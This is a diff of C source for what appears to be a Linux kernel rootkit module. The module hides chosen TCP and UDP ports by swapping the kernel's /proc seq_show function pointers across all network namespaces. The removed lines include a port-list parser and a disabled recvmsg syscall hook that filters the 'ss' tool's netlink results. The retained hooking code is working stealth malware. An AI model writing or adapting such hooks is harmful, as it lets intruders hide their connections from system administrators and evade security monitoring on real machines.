@@ -45,9 +45,6 @@ void enable_ro(void)
 }
 
 
-
-int socket_hiding_state = SOCKET_STATE_VISIBLE;
-
 int (*real_tcp4_seq_show)(struct seq_file*, void*);
 int (*real_udp4_seq_show)(struct seq_file*, void*);
 int (*real_packet_rcv)( struct sk_buff*,
@@ -58,89 +55,14 @@ asmlinkage long (*real_sys_recvmsg)(int, struct msghdr*, unsigned) = (void*) SM_
 void** tcp_hook_fn_ptr;
 void** udp_hook_fn_ptr;
 
-/* TCP/UDP ports to hide */
-short tcp_port_to_hide[MAX_HIDE_PORTS];
-short udp_port_to_hide[MAX_HIDE_PORTS];
-int num_tcp_port_to_hide = 0;
-int num_udp_port_to_hide = 0;
-
-void parse_socket_port(char* str_port)
-{
-    char* str_port_no = str_port + 1;
-    short port_no;
-
-    // Make sure the string is long enough
-    if (strlen(str_port) < 2) {
-        return;
-    }
-
-    // Extract the port number
-    if (sscanf(str_port_no, "%hd", &port_no) <= 0) {
-        return;
-    }
-
-    // Parse the prefix
-    switch (*str_port) {
-        case 't':
-        case 'T':
-            tcp_port_to_hide[num_tcp_port_to_hide++] = port_no;
-            break;
-        case 'u':
-        case 'U':
-            udp_port_to_hide[num_udp_port_to_hide++] = port_no;
-            break;
-        case 'a':
-        case 'A':
-            tcp_port_to_hide[num_tcp_port_to_hide++] = port_no;
-            udp_port_to_hide[num_udp_port_to_hide++] = port_no;
-            break;
-        default:
-            break;
-    }
-    return;
-}
-
-void set_socket_ports(char *ports)
-{
-    char *c = ports;
-    char *pos = strstr(c, ",");
-
-    // Reset the lists
-    num_tcp_port_to_hide = 0;
-    num_udp_port_to_hide = 0;
-
-    // Split ports by commas and parse them
-    while(pos != NULL) {
-        *pos = '\0';
-        parse_socket_port(c);
-
-        c = pos + 1;
-        pos = strstr(c, ",");
-    }
-    parse_socket_port(c);
-}
-
-inline int check_port_in_list(short port, short *list, int size)
-{
-    int i;
-    for (i = 0; i < size; i++) {
-        if (list[i] == port) {
-            return 1;
-        }
-    }
-    return 0;
-}
-
 inline int hide_tcp_port(short port)
 {
-    // Convert port to host format
-    return check_port_in_list(ntohs(port), tcp_port_to_hide, num_tcp_port_to_hide);
+    return should_hide(IPPROTO_TCP, ntohs(port));
 }
 
 inline int hide_udp_port(short port)
 {
-    // Convert port to host format
-    return check_port_in_list(ntohs(port), udp_port_to_hide, num_udp_port_to_hide);
+    return should_hide(IPPROTO_UDP, ntohs(port));
 }
 
 /*
@@ -230,73 +152,8 @@ return NULL;
     return ret;*/
 }
 
-#if 0
-asmlinkage long fake_recvmsg(int fd, struct msghdr __user *umsg, unsigned flags)
-{
-    // Call the real function
-    long ret = real_sys_recvmsg(fd, umsg, flags);
-
-    // Check if the file is really a socket and get it
-    int err = 0;
-    struct socket *s = sockfd_lookup(fd, &err);
-    struct sock *sk = s->sk;
-
-    // Check if the socket is used for the inet_diag protocol
-    if (!err && sk->sk_family == AF_NETLINK && sk->sk_protocol == NETLINK_INET_DIAG) {
-
-        // Check if it is a process called "ss" (optional ;))
-        /*if (strcmp(current->comm, "ss") == 0) {*/
-        long remain = ret;
-
-        // Copy data from user space to kernel space
-        struct msghdr* msg = kmalloc(ret, GFP_KERNEL);
-        int err = copy_from_user(msg, umsg, ret);
-        struct nlmsghdr* hdr = msg->msg_iter.iov_base;
-        if (err) {
-            return ret; // panic
-        }
-
-        // Iterate the entries
-        do {
-            struct inet_diag_msg* r = NLMSG_DATA(hdr);
-
-            // We only have to consider TCP ports here because ss fetches
-            // UDP information from /proc/udp which we already handle
-            if (hide_tcp_port(r->id.idiag_sport) || hide_tcp_port(r->id.idiag_dport)) {
-                // Hide the entry by coping the remaining entries over it
-                long new_remain = remain;
-                struct nlmsghdr* next_entry = NLMSG_NEXT(hdr, new_remain);
-                memmove(hdr, next_entry, new_remain);
-
-                // Adjust the length variables
-                ret -= (remain - new_remain);
-                remain = new_remain;
-            } else {
-                // Nothing to do -> skip this entry
-                hdr = NLMSG_NEXT(hdr, remain);
-            }
-        } while (remain > 0);
-
-        // Copy data back to user space
-        err = copy_to_user(umsg, msg, ret);
-        kfree(msg);
-        if (err) {
-            return ret; // panic
-        }
-        /*}*/
-    }
-    return ret;
-}
-#endif
-
-int init_module(void){
-
-    printk(KERN_INFO "Socket Hiding loaded.\n");
+static int init_procstuff(void){
     struct net *net_ns;
-
-    if (socket_hiding_state == SOCKET_STATE_HIDDEN) {
-        return 0;
-    }
 
     // Iterate all net namespaces
     list_for_each_entry(net_ns, ((typeof(&net_namespace_list))SM_net_namespace_list), list) {
@@ -319,35 +176,12 @@ int init_module(void){
         *udp_hook_fn_ptr = fake_udp4_seq_show;
     }
 
-/*
-    disable_ro();
-    real_sys_recvmsg = syscalls[__NR_recvmsg];
-    syscalls[__NR_recvmsg] = fake_recvmsg;
-    enable_ro();
-*/
-
-    socket_hiding_state = SOCKET_STATE_HIDDEN;
-
     return 0;
 }
 
-void cleanup_module(void){
-    printk(KERN_INFO "Socket Hiding unloaded.\n");
-    if (socket_hiding_state == SOCKET_STATE_VISIBLE) {
-        return;
-    }
+static void cleanup_procstuff(void){
     // Restore the hooked funtions
     *tcp_hook_fn_ptr = real_tcp4_seq_show;
     *udp_hook_fn_ptr = real_udp4_seq_show;
-
-/*
-    disable_ro();
-    syscalls[__NR_recvmsg] = real_sys_recvmsg;
-    enable_ro();
-*/
-
-    socket_hiding_state = SOCKET_STATE_VISIBLE;
-
-    return;
 }
 
